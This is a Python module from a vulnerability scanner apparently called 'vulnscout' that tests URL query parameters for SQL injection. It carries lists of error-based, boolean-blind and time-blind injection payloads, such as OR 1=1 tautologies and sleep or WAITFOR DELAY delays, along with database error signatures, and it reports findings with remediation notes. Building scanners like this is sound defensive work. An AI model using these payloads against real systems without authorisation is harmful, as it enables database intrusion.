"""SQL Injection Detector -- 报错注入 / 布尔盲注 / 时间盲注."""

from __future__ import annotations

import asyncio
import logging
import re
import urllib.parse
from typing import Dict, List, Optional

from vulnscout.detectors.base import (
    BaseDetector,
    Confidence,
    Finding,
    ScanContext,
    Severity,
)

logger = logging.getLogger(__name__)

# 报错注入 Payloads
ERROR_PAYLOADS = [
    "'",
    "\"",
    ")",
    "')",
    "\")",
    "1'",
    "1'-- -",
    "1'#",
    "1'/*",
    "1' AND 1=1-- -",
    "1' AND 1=2-- -",
]

# 布尔盲注 Payload pairs (true_condition, false_condition)
BOOLEAN_PAYLOADS = [
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1' AND 1=1-- -", "1' AND 1=2-- -"),
    ("1' OR '1'='1'", "1' OR '1'='2'"),
    ("' OR 1=1-- -", "' OR 1=2-- -"),
]

# 时间盲注 Payloads
TIME_PAYLOADS = [
    "1' AND sleep(3)-- -",
    "1' OR sleep(3)-- -",
    "' AND sleep(3)-- -",
    "' OR sleep(3)-- -",
    "1' AND (SELECT pg_sleep(3))-- -",
    "' WAITFOR DELAY '0:0:3'-- -",
]

# SQL 错误检测正则
ERROR_PATTERNS = [
    re.compile(r"SQL syntax.*MySQL", re.I),
    re.compile(r"Warning.*mysql_.*", re.I),
    re.compile(r"MySQLSyntaxErrorException", re.I),
    re.compile(r"valid MySQL result", re.I),
    re.compile(r"PostgreSQL.*ERROR", re.I),
    re.compile(r"Warning.*\Wpg_", re.I),
    re.compile(r"valid PostgreSQL result", re.I),
    re.compile(r"driver\.connect", re.I),
    re.compile(r"ORA-[0-9]{5}", re.I),
    re.compile(r"Oracle.*Driver", re.I),
    re.compile(r"SQLite/JDBCDriver", re.I),
    re.compile(r"SQLite\.Exception", re.I),
    re.compile(r"System\.Data\.SQLite\.SQLiteException", re.I),
    re.compile(r"Warning.*sqlite_.*", re.I),
    re.compile(r"SQLITE_ERROR", re.I),
    re.compile(r"Microsoft OLE DB Provider for SQL Server", re.I),
    re.compile(r"Driver.*SQL Server", re.I),
    re.compile(r"ODBC SQL Server Driver", re.I),
    re.compile(r"SQLServer JDBC Driver", re.I),
    re.compile(r"com\.mysql\.jdbc", re.I),
    re.compile(r"org\.postgresql", re.I),
    re.compile(r"Unclosed quotation mark", re.I),
    re.compile(r"Incorrect syntax near", re.I),
]


class SQLiDetector(BaseDetector):
    """SQL 注入漏洞检测器.

    使用多种检测策略：
    1. 报错注入 -- 触发数据库错误
    2. 布尔盲注 -- 比较 True/False 条件的响应差异
    3. 时间盲注 -- 检测 sleep 延迟
    """

    name = "sqli"
    description = "SQL 注入检测 -- 报错 / 布尔盲注 / 时间盲注"
    severity = Severity.CRITICAL
    supported_attack_params = ["query"]

    def __init__(self, http_client=None, config=None):
        super().__init__(http_client, config)
        self._timeout_sec = self.get_config("timeout", 10.0)

    async def detect(self, context: ScanContext) -> List[Finding]:
        """执行 SQL 注入检测."""
        findings: List[Finding] = []
        http = self.get_http_client()
        if not http:
            return findings

        tested_params: set = set()

        for ep in context.endpoints:
            url = ep.get("url", "")
            if not url or ep.get("method", "GET") != "GET":
                continue

            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                continue

            for param_name in params:
                test_key = f"{url}:{param_name}"
                if test_key in tested_params:
                    continue
                tested_params.add(test_key)

                original_value = params[param_name][0] if params[param_name] else "1"

                # Step 1: 报错注入检测
                error_finding = await self._test_error_based(http, url, param_name, original_value)
                if error_finding:
                    findings.append(error_finding)
                    continue  # 已确认注入，跳过后续测试

                # Step 2: 布尔盲注检测
                boolean_finding = await self._test_boolean_blind(http, url, param_name, original_value)
                if boolean_finding:
                    findings.append(boolean_finding)
                    continue

                # Step 3: 时间盲注检测
                time_finding = await _test_time_blind(http, url, param_name, original_value, self._timeout_sec)
                if time_finding:
                    findings.append(time_finding)

        return findings

    async def _test_error_based(
        self, http, url: str, param_name: str, original_value: str
    ) -> Optional[Finding]:
        """报错注入检测 -- 注入 SQL 语法错误."""
        for payload in ERROR_PAYLOADS:
            test_url = self._inject(url, param_name, payload)
            try:
                resp = await http.get(test_url)
                body = resp.text
                for pattern in ERROR_PATTERNS:
                    if pattern.search(body):
                        return Finding(
                            name="SQL 注入 -- 报错注入",
                            description=f"参数 '{param_name}' 存在报错型 SQL 注入，数据库信息泄露",
                            severity=Severity.CRITICAL,
                            confidence=Confidence.HIGH,
                            url=test_url,
                            parameter=param_name,
                            payload=payload,
                            evidence=pattern.search(body).group()[:200],
                            remediation="使用参数化查询或预编译语句，严格过滤用户输入",
                            cwe="CWE-89",
                            details={"db_error_pattern": pattern.pattern},
                        )
            except Exception as e:
                logger.debug("报错注入测试异常 %s: %s", test_url, e)
        return None

    async def _test_boolean_blind(
        self, http, url: str, param_name: str, original_value: str
    ) -> Optional[Finding]:
        """布尔盲注检测 -- 比较 True/False 条件响应差异."""
        for true_payload, false_payload in BOOLEAN_PAYLOADS:
            try:
                true_url = self._inject(url, param_name, true_payload)
                false_url = self._inject(url, param_name, false_payload)

                true_resp = await http.get(true_url)
                false_resp = await http.get(false_url)

                # 比较响应长度或内容
                if self._has_significant_difference(true_resp.text, false_resp.text):
                    # 确认与原始请求不同
                    original_url = self._inject(url, param_name, original_value)
                    orig_resp = await http.get(original_url)

                    if len(true_resp.text) != len(orig_resp.text) or \
                       len(false_resp.text) != len(orig_resp.text):
                        return Finding(
                            name="SQL 注入 -- 布尔盲注",
                            description=f"参数 '{param_name}' 存在布尔盲注 (True/False 响应差异)",
                            severity=Severity.HIGH,
                            confidence=Confidence.MEDIUM,
                            url=true_url,
                            parameter=param_name,
                            payload=true_payload,
                            evidence=f"True 响应: {len(true_resp.text)} bytes, False 响应: {len(false_resp.text)} bytes",
                            remediation="使用参数化查询，避免将用户输入直接拼接到 SQL 语句中",
                            cwe="CWE-89",
                        )
            except Exception as e:
                logger.debug("布尔盲注测试异常 %s: %s", url, e)
        return None

    def _has_significant_difference(self, body1: str, body2: str, threshold: float = 0.05) -> bool:
        """判断两个响应是否有显著差异."""
        if not body1 or not body2:
            return False
        max_len = max(len(body1), len(body2))
        if max_len == 0:
            return False
        diff_ratio = abs(len(body1) - len(body2)) / max_len
        return diff_ratio > threshold

    def _inject(self, url: str, param_name: str, payload: str) -> str:
        """将 Payload 注入 URL 参数."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[param_name] = [payload]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))


async def _test_time_blind(
    http, url: str, param_name: str, original_value: str, timeout_sec: float
) -> Optional[Finding]:
    """时间盲注检测 -- 测试 sleep 延迟."""
    baseline_time = None

    for payload in TIME_PAYLOADS:
        test_url = _inject_param(url, param_name, payload)
        try:
            start = asyncio.get_event_loop().time()
            await http.get(test_url)
            elapsed = asyncio.get_event_loop().time() - start

            if baseline_time is None:
                baseline_time = elapsed
                continue

            # 如果响应时间显著增加（>= 2秒），可能是时间盲注
            if elapsed >= baseline_time + 2.0:
                return Finding(
                    name="SQL 注入 -- 时间盲注",
                    description=f"参数 '{param_name}' 存在时间盲注 (延迟 {elapsed:.1f}s)",
                    severity=Severity.HIGH,
                    confidence=Confidence.MEDIUM,
                    url=test_url,
                    parameter=param_name,
                    payload=payload,
                    evidence=f"响应延迟: {elapsed:.1f}s (基线: {baseline_time:.1f}s)",
                    remediation="使用参数化查询，限制数据库执行超时",
                    cwe="CWE-89",
                    details={"baseline_seconds": baseline_time, "delay_seconds": elapsed},
                )
        except Exception as e:
            logger.debug("时间盲注测试异常 %s: %s", test_url, e)

    return None


def _inject_param(url: str, param_name: str, payload: str) -> str:
    """工具函数 -- 注入 Payload 到 URL 参数."""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    params[param_name] = [payload]
    new_query = urllib.parse.urlencode(params, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))
